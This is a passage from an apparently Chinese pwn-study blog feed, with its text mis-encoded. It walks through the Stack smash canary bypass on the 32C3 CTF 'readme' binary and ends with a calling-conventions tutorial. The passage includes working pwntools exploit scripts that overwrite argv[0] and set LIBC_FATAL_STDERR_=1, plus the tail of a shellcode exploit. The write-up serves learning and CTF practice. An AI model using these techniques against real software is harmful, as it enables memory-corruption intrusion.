espæŒ‡ä»¤è·³è½¬åˆ°è°ƒæ•´åçš„æ ˆé¡¶ï¼Œå†å‘ä¸Šé¢å†™å…¥shellcodeï¼Œæœ€åå†æ¬¡æ‰§è¡Œjum_espè·³è½¬æ‰§è¡Œshellcode  </span><br><br>r.sendline(Payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h1 id="Stack-smash"><a href="#Stack-smash" class="headerlink" title="Stack smash"></a>Stack smash</h1><p>canaryä¿æŠ¤æœ‰å¤šç§ç»•è¿‡æ–¹å¼ï¼Œå…¶ä¸­Stack smashå°±æ˜¯ç»•è¿‡canaryä¿æŠ¤çš„ä¸€ç§æ–¹å¼ã€‚ä¹‹å‰åšè¿‡çš„canaryä¿æŠ¤ç»•è¿‡æ˜¯å¡«å……canaryæœ€åçš„å­—èŠ‚å¹¶ä¹‹åæš´åŠ›æšä¸¾æˆ–æ˜¯ç›´æ¥æ³„éœ²ï¼Œä»è€Œé¿å…canaryä¿æŠ¤ç¨‹åºæŠ¥é”™ã€‚Stack smashè¿™ä¸ªæ–¹æ³•å¹¶ä¸åœ¨ä¹æ˜¯å¦ä¼šå¼•å‘canaryæŠ¥é”™ï¼Œè€Œæ˜¯åˆ©ç”¨æŠ¥é”™çš„å†…å®¹ã€‚</p><p>åœ¨ç¨‹åºå¯åŠ¨canaryä¿æŠ¤ä¹‹åï¼Œå¦‚æœå‘ç°canaryè¢«ä¿®æ”¹çš„è¯å°±ä¼šæ‰§è¡Œ <code>_stack_chk_fail</code> å‡½æ•°æ¥æ‰“å° argv[0] æŒ‡é’ˆæ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²ï¼Œæ­£å¸¸æƒ…å†µä¸‹è¿™ä¸ªæŒ‡é’ˆæŒ‡å‘ç¨‹åºåã€‚å¦‚æœæˆ‘ä»¬åˆ©ç”¨æ ˆæº¢å‡ºè¦†ç›– argv[0] ä¸ºæˆ‘ä»¬æƒ³è¦è¾“å‡ºçš„å­—ç¬¦ä¸²åœ°å€ï¼Œé‚£ä¹ˆåœ¨ <code>_fortify_fail</code> å‡½æ•°ä¸­å°±ä¼šè¾“å‡ºæˆ‘ä»¬æƒ³è¦çš„ä¿¡æ¯ã€‚</p><blockquote><p>è¿™ä¸ªæ–¹æ³•é€‚ç”¨äºglibc-2.31ä»¥å‰çš„ç¨‹åºï¼Œä¹‹åçš„ç¨‹åºä¸ä¼šæ‰“å° argv[0] æŒ‡é’ˆæ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __attribute__ ((<span class="hljs-keyword">noreturn</span>)) __stack_chk_fail (<span class="hljs-type">void</span>)<br>&#123;<br>  __fortify_fail (<span class="hljs-string">&quot;stack smashing detected&quot;</span>);<br>&#125;<br><span class="hljs-type">void</span> __attribute__ ((<span class="hljs-keyword">noreturn</span>)) internal_function __fortify_fail (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *msg)<br>&#123;<br>  <span class="hljs-comment">/* The loop is added only to keep gcc happy.  */</span><br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    __libc_message (<span class="hljs-number">2</span>, <span class="hljs-string">&quot;*** %s ***: %s terminated\n&quot;</span>,<br>                    msg, __libc_argv[<span class="hljs-number">0</span>] ?: <span class="hljs-string">&quot;&lt;unknown&gt;&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>ä»¥2015å¹´32C3 CTF readme ä¸ºä¾‹</p><p><a href="https://github.com/ctfs/write-ups-2015/tree/master/32c3-ctf-2015/pwn/readme-200">2015 32C3 CTF readme</a></p><p>è§¦å‘canaryä¿æŠ¤åç¨‹åºä¼šè¾“å‡ºä¸€æ®µæŠ¥é”™  </p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-05_16-51-08.png"></p><p>å¼€å§‹è§£é¢˜ï¼Œåæ±‡ç¼–ä¸€ä¸‹æºç ã€‚</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-05_17-14-00.png"></p><p>ç¨‹åºä¸­æœ‰ä¸¤æ¬¡è¾“å…¥ï¼Œç¬¬ä¸€æ¬¡è¾“å…¥èµ‹å€¼ç»™v3åä¸å¯¹å…¶è¿›è¡Œä»»ä½•æ“ä½œï¼›ç¬¬äºŒæ¬¡è¾“å…¥èµ‹å€¼ç»™v1ï¼Œå°†å…¶ä¸æ–­èµ‹å€¼ç»™byte_600D20è¿™ä¸ªæ•°ç»„ã€‚</p><p>åŒå‡»æŸ¥çœ‹æ•°ç»„</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-05_17-16-59.png"></p><p>ä¹Ÿå°±æ˜¯è¯´è¿™é“é¢˜æˆ‘ä»¬åªéœ€è¦æ‹¿flagè€Œä¸æ˜¯æ‹¿shellï¼Œè€Œä¸”v2å˜é‡æ¥æ”¶ç¬¬äºŒæ¬¡è¾“å…¥çš„å­—ç¬¦ä¸²ï¼Œå¹¶ä¸”ä¼šä¸æ–­è¦†ç›–åŸæœ‰çš„flagå†…å®¹ã€‚</p><p>åœ¨è¿™ä¹‹åè¿˜æœ‰ä¸€æ¡è¯­å¥</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">memset</span>((<span class="hljs-type">void</span> *)((<span class="hljs-type">int</span>)v0 + <span class="hljs-number">6294816LL</span>), <span class="hljs-number">0</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(<span class="hljs-number">32</span> - v0));<br></code></pre></td></tr></table></figure><p> è¿™æ¡ä¼ªä»£ç çš„åŸå‹æ˜¯è¿™æ ·çš„</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> *<span class="hljs-title">memset</span><span class="hljs-params">(<span class="hljs-type">void</span> *ptr, <span class="hljs-type">int</span> value, <span class="hljs-type">size_t</span> num)</span></span>;<br></code></pre></td></tr></table></figure><p>æ„æ€æ˜¯ä»å†…å­˜æŒ‡é’ˆptræŒ‡å‘çš„ä½ç½®ç›´åˆ°å‘ånumå­—èŠ‚éƒ½è¢«valueå–ä»£ã€‚</p><p>ç»“åˆ <code>byte_600D20[v0++] = v1;</code> ï¼Œæˆ‘ä»¬é¢˜ç›®ä¸­çš„å‡½æ•°æ„æ€å°±æ˜¯æ— è®ºä½ æ˜¯å¦è¿›è¡Œç¬¬äºŒæ¬¡è¾“å…¥ï¼Œåœ¨ç¨‹åºç»“æŸå flag çš„ä½ç½®éƒ½å°†è¢«æ›¿æ¢ï¼Œæˆ‘ä»¬å°±æ— æ³•é€šè¿‡ç›´æ¥ä¿®æ”¹ argv[0] çš„å€¼è·å¾— flag ã€‚</p><p>ä½†æ˜¯flagè¢«æ˜ å°„äº†ä¸¤æ¬¡ï¼Œ0x600D21ä¸­çš„flagè¢«ä¿®æ”¹ï¼Œé‚£æˆ‘ä»¬å°±æŠŠ argv[0] æŒ‡å‘ 0x400d21ã€‚</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-06_16-02-26.png"></p><blockquote><p>çœ‹äº†å¾ˆå¤šå¤§ä½¬çš„è§£æä¹Ÿæ²¡ææ˜ç™½ï¼Œç¨‹åºä¸­æœ‰ä¸¤ä¸ªloadæ®µï¼Œä¸ºä»€ä¹ˆç¬¬äºŒä¸ªloadæ®µä¸­çš„flagï¼Œä¼šè¢«æ˜ å°„åˆ°ç¬¬ä¸€ä¸ªload æ®µé‡ŒğŸ¥²</p></blockquote><p>æŸ¥æ‰¾argv[0]çš„ä½ç½®ï¼Œä¸€å…±æ‰¾åˆ°ä¸‰ç§æ–¹æ³•ï¼š</p><ul><li>æ–¹æ³•ä¸€ï¼š</li></ul><p>ç”¨pedaæŒ‚è½½æ–‡ä»¶ï¼Œå…ˆåœ¨ç¬¬ä¸€ä¸ªgetså¤„ä¸‹æ–­ç‚¹</p><p><img src="D:/ç¬”è®°/PWN/ROP/ç²¾ç¾é…å›¾/Snipaste_2023-07-06_15-37-25.png"></p><p>åˆ©ç”¨findå‘½ä»¤æŸ¥æ‰¾ä¸æ–‡ä»¶åæœ‰å…³çš„åœ°å€ï¼Œå†è®¡ç®—å½“å‰çš„rspæŒ‡é’ˆä¸å…¶çš„è·ç¦»</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-06_15-42-28.png"></p><ul><li>æ–¹æ³•äºŒ</li></ul><p>ä¹Ÿæ˜¯åˆ©ç”¨argv[0]æŒ‡å‘ç¨‹åºåçš„ç‰¹ç‚¹å¯»æ‰¾ï¼Œç›´æ¥ä¸‹æ–­ç‚¹ï¼ŒæŸ¥æ‰¾æŒ‡å‘ç¨‹åºåçš„å†…å­˜æŒ‡é’ˆã€‚</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-07-06_15-46-20.png"></p><ul><li>æ–¹æ³•ä¸‰</li></ul><p>ç”¨å‘½ä»¤<code>p &amp; __libc_argv[0]</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gdb">&gt; p &amp; __libc_argv[0]<br>$1 = (char **) 0x7fffffffdff8<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬è¦å†™å…¥536ä¸ªå­—èŠ‚ä¹Ÿå°±æ˜¯0x218ä¸ªå­—èŠ‚æ‰èƒ½å°†argv[0]è¦†ç›–æ‰ï¼Œæ‰€ä»¥payloadæ„æˆåº”è¯¥æ˜¯0x218å­—èŠ‚çš„å¡«å……ç‰©åŠ ä¸Šæˆ‘ä»¬ç›®æ ‡flagçš„åœ°å€ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p=process(<span class="hljs-string">&#x27;./readme.bin&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x218</span>+p64(<span class="hljs-number">0x400d20</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;What&#x27;s your name? &quot;</span>)<br>p.sendline(payload)<br><br>p.recvuntil(<span class="hljs-string">&quot;Please overwrite the flag:&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;Modifier&#x27;</span>)<br><br><span class="hljs-built_in">print</span> p.recv()<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯æ²¡æœ‰è¾“å‡ºï¼Œæ˜¯å› ä¸ºç¨‹åºæŠŠé”™è¯¯ä¿¡å·å‘é€ç»™äº†æ‰§è¡Œç¨‹åºçš„ç»ˆç«¯é‡Œï¼Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹ç¯å¢ƒå˜é‡è®©é”™è¯¯ä¿¡æ¯é€šè¿‡ç½‘ç»œä¼ åˆ°æˆ‘ä»¬çš„ç»ˆç«¯é‡Œã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬è¦åˆ©ç”¨ç¬¬äºŒæ¬¡çš„è¾“å…¥ï¼Œå°† <code>LIBC_FATAL_STDERR_=1</code> å†™å…¥åˆ°ç¯å¢ƒå˜é‡ä¸­ã€‚åœ¨ç¬¬ä¸€ä¸ªpayloadå½“ä¸­æˆ‘ä»¬å·²ç»æŠŠæŒ‡é’ˆæŒ‡å‘äº†argv[0]ï¼Œéœ€è¦å°†æŒ‡é’ˆå†æ¬¡æŒ‡å‘ç¬¬äºŒæ¬¡è¾“å…¥ç‚¹ï¼Œç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">from</span> <span class="hljs-variable">pwn</span> <span class="hljs-variable">import</span> *<br><br><span class="hljs-variable">p</span> = <span class="hljs-function"><span class="hljs-title">process</span>(<span class="hljs-string">&#x27;./readme.bin&#x27;</span>)</span><br><br><span class="hljs-variable">payload_1</span> = <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0</span><span class="hljs-variable">x218</span> + <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-number">0</span><span class="hljs-variable">x400d20</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">0</span><span class="hljs-variable">x600d20</span>)</span><br><span class="hljs-variable">p.sendline</span>(<span class="hljs-variable">payload_1</span>)<br><br><span class="hljs-variable">payload_2</span> = <span class="hljs-string">&quot;LIBC_FATAL_STDERR_=1&quot;</span><br><span class="hljs-variable">p.sendline</span>(<span class="hljs-variable">payload_2</span>)<br><br><span class="hljs-variable">print</span> <span class="hljs-variable">p.recvall</span>()<br></code></pre></td></tr></table></figure><hr><p>åŸæ¥æ ˆæº¢å‡ºä¸æ˜¯æƒ³è±¡ä¸­çš„è¾£ä¹ˆç®€å•æ</p><p>æ ˆä¸Šçš„ä¸œè¥¿ç»ˆäºæ•´ç†å¥½å™œğŸ˜Š</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>æ ˆ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å‡½æ•°è°ƒç”¨çº¦å®š</title>
    <link href="/2023/06/19/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/"/>
    <url>/2023/06/19/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/</url>
    
    <content type="html"><![CDATA[<p>å‡½æ•°å‚æ•°æ€ä¹ˆä¼ é€’å’Œç”±è°æ¸…é™¤å †æ ˆ</p><span id="more"></span><p>ç‚’å†·é¥­ï¼Œéƒ½å¿«è¦å¿˜è®°è‡ªå·±æœ‰ä¸€ä¸ªåšå®¢äº† (x</p><h1 id="ä»€ä¹ˆæ˜¯å‡½æ•°è°ƒç”¨çº¦å®š"><a href="#ä»€ä¹ˆæ˜¯å‡½æ•°è°ƒç”¨çº¦å®š" class="headerlink" title="ä»€ä¹ˆæ˜¯å‡½æ•°è°ƒç”¨çº¦å®š"></a>ä»€ä¹ˆæ˜¯å‡½æ•°è°ƒç”¨çº¦å®š</h1><p>åœ¨å‡½æ•°è¢«è°ƒç”¨çš„è¿‡ç¨‹ä¸­ï¼Œç¼–è¯‘å™¨éƒ½è¿›è¡Œäº†ä»¥ä¸‹çš„å·¥ä½œï¼š</p><ol><li><p>æŠŠè°ƒç”¨è€…çš„åœ°å€å‹å…¥æ ˆ</p></li><li><p>æŠŠå‡½æ•°çš„å‚æ•°å‹å…¥æ ˆæˆ–è€…å­˜å‚¨åˆ°å¯„å­˜å™¨å½“ä¸­</p></li><li><p>è°ƒè½¬åˆ°è¢«å¼•ç”¨å‡½æ•°</p></li><li><p>æŠŠå‡½æ•°ä½¿ç”¨çš„å¯„å­˜å™¨å‹å…¥æ ˆ</p></li><li><p>æ‰§è¡Œå‡½æ•°</p></li><li><p>å¤„ç†å‡½æ•°è¿”å›å€¼</p></li><li><p>å°†ç¬¬ä¸‰æ­¥ä¸­å‹æ ˆçš„å¯„å­˜å™¨æ¢å¤åˆ°åŸå§‹å€¼</p></li><li><p>æ¸…ç©ºç¬¬ä¸€éƒ¨ä¸­çš„å‹æ ˆå‚æ•°å’Œå¤„ç†è¿”å›åœ°å€</p></li><li><p>è¿”å›åˆ°è°ƒç”¨è€…è°ƒç”¨æ—¶çš„åœ°å€ï¼ˆå³æ­¥éª¤ä¸€æ—¶è®°å½•çš„åœ°å€ï¼‰</p></li></ol><p>å‡½æ•°è°ƒç”¨çº¦å®šï¼Œå°±æ˜¯å¯¹å‡½æ•°è°ƒç”¨çš„ä¸€ä¸ªçº¦æŸå’Œè§„å®š(è§„èŒƒ)ï¼Œæè¿°äº†å‡½æ•°å‚æ•°æ˜¯æ€ä¹ˆä¼ é€’å’Œç”±è°æ¸…é™¤å †æ ˆçš„ã€‚ï¼ˆå †æ ˆå¹³è¡¡ï¼Ÿï¼‰</p><blockquote><p>x64çš„å‰å››ä¸ªå‚æ•°ä½¿ç”¨rcxï¼Œrdxï¼Œr8ï¼Œr9ä¼ é€’ï¼Œä¹‹åçš„å‚æ•°é€šè¿‡æ ˆæ¥ä¼ é€’</p></blockquote><p>å®ƒå†³å®šä»¥ä¸‹ä¸‰ä¸ªæ–¹é¢ï¼š</p><ul><li>å‡½æ•°å‚æ•°ä¼ é€’çš„æ–¹å¼ï¼ˆæ˜¯å¦é‡‡ç”¨å¯„å­˜å™¨ä¼ é€’å‡½æ•°ï¼Œé‡‡ç”¨é‚£ä¸ªå¯„å­˜å™¨è°ƒç”¨å‡½æ•°ï¼Œå‚æ•°å‹æ ˆé¡ºåºç­‰ï¼‰</li><li>å‡½æ•°è°ƒç”¨ç»“æŸåçš„æ ˆæŒ‡é’ˆç”±è°æ¢å¤ï¼ˆè¢«è°ƒç”¨è€…æ¢å¤æˆ–æ˜¯è¢«è°ƒç”¨çš„å‡½æ•°æ¢å¤ï¼‰</li><li>å‡½æ•°ä¿®é¥°åçš„äº§ç”Ÿæ–¹æ³•</li></ul><p>æˆ‘ä»¬æ„é€ ä¸€ä¸ªå‡½æ•°çš„æ—¶å€™ï¼Œä¼šè§„å®šè¿”å›ç±»å‹å’Œå‡½æ•°åï¼ˆå‚æ•°åˆ—è¡¨ï¼‰ï¼Œå¦‚ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">funcA</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">funcB</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span>; <br></code></pre></td></tr></table></figure><p>é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰å¦å¤–ä¸€éƒ¨åˆ†ï¼Œå°±æ˜¯å‡½æ•°çš„è°ƒç”¨çº¦å®šï¼Œç”±ç³»ç»Ÿè‡ªåŠ¨ç”Ÿæˆï¼Œä¹Ÿå¯ä»¥æœ‰æˆ‘ä»¬æ¥æ‰‹åŠ¨ç¼–å†™è§„å®šï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __cdecl <span class="hljs-title function_">funA</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> __stdcall <span class="hljs-title function_">funcB</span><span class="hljs-params">()</span>;<br></code></pre></td></tr></table></figure><h4 id="å¸¸è§çš„è°ƒç”¨çº¦å®š"><a href="#å¸¸è§çš„è°ƒç”¨çº¦å®š" class="headerlink" title="å¸¸è§çš„è°ƒç”¨çº¦å®š"></a>å¸¸è§çš„è°ƒç”¨çº¦å®š</h4><ul><li>cï¼š__cdecl ã€__stdcallã€__fastcallã€nakedã€__pascall</li><li>c++ï¼š__cdecl ã€__stdcallã€__fastcallã€nakedã€__pascallã€__thiscall</li></ul><h4 id="è°ƒç”¨çº¦å®šçš„ä½¿ç”¨"><a href="#è°ƒç”¨çº¦å®šçš„ä½¿ç”¨" class="headerlink" title="è°ƒç”¨çº¦å®šçš„ä½¿ç”¨"></a>è°ƒç”¨çº¦å®šçš„ä½¿ç”¨</h4><p>è°ƒç”¨çº¦å®šä¹¦å†™åœ¨å‡½æ•°çš„å‰é¢ï¼Œç›¸å½“äºå‡½æ•°ç±»å‹çš„ä¸€éƒ¨åˆ†ã€‚è¦æ±‚å‡½æ•°çš„å£°æ˜å’Œå®šä¹‰è¦æœ‰ç›¸åŒçš„è°ƒç”¨çº¦å®šã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">Add</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span>;   <span class="hljs-comment">//é»˜è®¤æ˜¯__cdecl</span><br><span class="hljs-type">int</span> __stdcall <span class="hljs-title function_">Add</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> a+b;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä»¥ä¸Šåœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­å°±ä¼šæç¤ºå‡ºé”™ï¼Œå› ä¸ºå£°æ˜å’Œå®šä¹‰çš„è°ƒç”¨çº¦å®šä¸åŒã€‚æ­£ç¡®åº”è¯¥æ˜¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __stdcall <span class="hljs-title function_">Add</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span>;<br><span class="hljs-type">int</span> __stdcall <span class="hljs-title function_">Add</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> a+b;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="ä¸åŒè°ƒç”¨ä¸‹çš„è§„åˆ™"><a href="#ä¸åŒè°ƒç”¨ä¸‹çš„è§„åˆ™" class="headerlink" title="ä¸åŒè°ƒç”¨ä¸‹çš„è§„åˆ™"></a>ä¸åŒè°ƒç”¨ä¸‹çš„è§„åˆ™</h1><p>é¦–å…ˆæˆ‘ä»¬å®šä¹‰ä¸¤ä¸ªæ¦‚å¿µï¼Œå³â€œè¢«è°ƒç”¨è€…â€å’Œâ€œè°ƒç”¨è€…â€ã€‚å¦‚ä¸‹Add()å‡½æ•°å°±æ˜¯â€œè¢«è°ƒç”¨è€…â€ï¼ŒShoowResult()å‡½æ•°å°±æ˜¯â€œè°ƒç”¨è€…â€ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Add</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> a+b;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ShowResult</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    cout&lt;&lt;<span class="hljs-built_in">add</span>(<span class="hljs-number">5</span>,<span class="hljs-number">10</span>)&lt;&lt;endl;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="cdecl"><a href="#cdecl" class="headerlink" title="__cdecl"></a>__cdecl</h2><p>__cdeclæ˜¯C Declarationçš„ç¼©å†™ï¼Œè¡¨ç¤ºC\C++é»˜è®¤çš„å‡½æ•°è°ƒç”¨çº¦å®š</p><h4 id="è°ƒç”¨æ–¹å¼"><a href="#è°ƒç”¨æ–¹å¼" class="headerlink" title="è°ƒç”¨æ–¹å¼"></a>è°ƒç”¨æ–¹å¼</h4><ul><li>é‡‡ç”¨æ ˆä¼ é€’å‚æ•°ï¼Œå‚æ•°<strong>ä»å³å‘å·¦</strong>ä¾æ¬¡å…¥æ ˆ</li><li>ç”±è°ƒç”¨è€…æ¢å¤æ ˆé¡¶æŒ‡é’ˆ</li><li>ç¼–è¯‘å™¨åœ¨ç¼–è¯‘æ—¶ä¼šåœ¨å‡½æ•°åå‰åŠ ä¸Šä¸€ä¸ªä¸‹åˆ’çº¿å‰ç¼€ç”Ÿæˆä¿®é¥°åï¼Œæ ¼å¼ä¸º_functionã€‚å¦‚Add()çš„ä¿®é¥°åæ˜¯_Add()</li></ul><blockquote><p>æ³¨æ„ï¼šè°ƒç”¨å‚æ•°ä¸ªæ•°å¯å˜çš„å‡½æ•°åªèƒ½é‡‡ç”¨è¿™ç§æ–¹å¼</p></blockquote><h2 id="stdcall"><a href="#stdcall" class="headerlink" title="__stdcall"></a>__stdcall</h2><p>__stdcallæ˜¯Standard Callçš„ç¼©å†™ï¼Œæ˜¯C++çš„æ ‡å‡†è°ƒç”¨æ–¹å¼ã€‚</p><h4 id="è°ƒç”¨æ–¹å¼-1"><a href="#è°ƒç”¨æ–¹å¼-1" class="headerlink" title="è°ƒç”¨æ–¹å¼"></a>è°ƒç”¨æ–¹å¼</h4><ul><li>é‡‡ç”¨æ ˆä¼ é€’å‚æ•°ï¼Œå‚æ•°<strong>ä»å³å‘å·¦</strong>ä¾æ¬¡å…¥æ ˆ</li><li>ç”±è¢«è°ƒç”¨è€…è´Ÿè´£æ¢å¤æ ˆé¡¶æŒ‡é’ˆ</li><li>åœ¨è¾“å‡ºå‡½æ•°åå‰åŠ ä¸Šä¸€ä¸ªä¸‹åˆ’çº¿å‰ç¼€ï¼Œåé¢åŠ ä¸€ä¸ª@ç¬¦å·å’Œå…¶å‚æ•°çš„å­—èŠ‚æ•°ï¼Œæ ¼å¼ä¸º_function@numberã€‚å¦‚å‡½æ•°Addçš„ä¿®é¥°åæ˜¯_Add@8</li></ul><p>__stdcallä¸__cdeclæœ€ä¸»è¦çš„åŒºåˆ«æ˜¯ç¬¬2æ¡è§„å®šï¼šç”±â€œè¢«è°ƒç”¨è€…â€æ¸…ç©ºå®é™…ä¸Šå°±æ˜¯æŠŠå¯¹åº”å‚æ•°æ•°ç›®çš„æ•°æ®ä»æ ˆä¸­å¼¹å‡ºï¼Œè¿™æ ·çš„ç¼ºç‚¹å°±æ˜¯å®ƒä¸èƒ½ä½¿ç”¨äºé‚£äº›ä¸ç¡®å®šæ•°ç›®å‚æ•°çš„å‡½æ•°ã€‚</p><p>å¥½å¤„åœ¨äºåªéœ€è¦åœ¨å‡½æ•°å†…éƒ¨ç¼–è¯‘å‡ºæ¢å¤æ ˆé¡¶çš„ä»£ç ï¼Œè€Œè°ƒç”¨è€…æ¢å¤åˆ™éœ€è¦åœ¨è°ƒç”¨å‡ºç¼–è¯‘å‡ºæ¢å¤æ ˆé¡¶çš„ä»£ç ã€‚</p><h2 id="fastcall"><a href="#fastcall" class="headerlink" title="__fastcall"></a>__fastcall</h2><p>__fastcallæ˜¯å¿«é€Ÿè°ƒç”¨ï¼Œå› ä¸ºæœ‰éƒ¨åˆ†å‚æ•°å¯ä»¥é€šè¿‡å¯„å­˜å™¨ç›´æ¥ä¼ é€’ï¼Œæ•ˆç‡æ¯”è¾ƒé«˜ã€‚</p><h4 id="è°ƒç”¨æ–¹å¼-2"><a href="#è°ƒç”¨æ–¹å¼-2" class="headerlink" title="è°ƒç”¨æ–¹å¼"></a>è°ƒç”¨æ–¹å¼</h4><ul><li>å‡½æ•°çš„ç¬¬ä¸€ä¸ªå’Œç¬¬äºŒä¸ªï¼ˆ<strong>ä»å·¦å‘å³</strong>ï¼‰32å­—èŠ‚å‚æ•°ï¼ˆæˆ–è€…å°ºå¯¸æ›´å°çš„ï¼‰é€šè¿‡ecxå’Œedxä¼ é€’ï¼ˆå¯„å­˜å™¨ä¼ é€’ï¼‰ï¼Œå…¶ä»–å‚æ•°é€šè¿‡æ¡Ÿä¼ é€’ã€‚ä»ç¬¬ä¸‰ä¸ªå‚æ•°ï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰å¼€å§‹<strong>ä»å³å‘å·¦</strong>çš„é¡ºåºå‹æ ˆ</li><li>ç”±è¢«è°ƒç”¨è€…æ¢å¤æ ˆé¡¶æŒ‡é’ˆ</li><li>åœ¨å‡½æ•°åå‰åŠ ä¸Š@ï¼Œåœ¨å‡½æ•°åååŠ @å’Œå‚æ•°å­—èŠ‚æ•°ï¼Œæ ¼å¼ä¸º@function@number</li></ul><h2 id="thiscall"><a href="#thiscall" class="headerlink" 